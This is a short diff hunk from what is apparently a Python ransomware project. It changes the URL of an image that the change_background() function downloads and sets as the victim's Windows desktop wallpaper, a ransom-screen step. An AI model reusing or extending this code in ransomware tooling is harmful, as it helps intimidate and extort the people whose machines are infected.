@@ -279,7 +279,7 @@ def banner():
 
 def change_background():
     
-    request.urlretrieve("https://github.com/Menesay/Menesay/blob/main/duvi_bg.png?raw=true", argv[0][:-16]+"\\duvi_bg.png")
+    request.urlretrieve("https://github.com/Menesay/Python-Ransomware/blob/main/duvi_bg.png", argv[0][:-16]+"\\duvi_bg.png")
     windll.user32.SystemParametersInfoW(20, 0, argv[0][:-16]+"\\duvi_bg.png", 3)
 
 
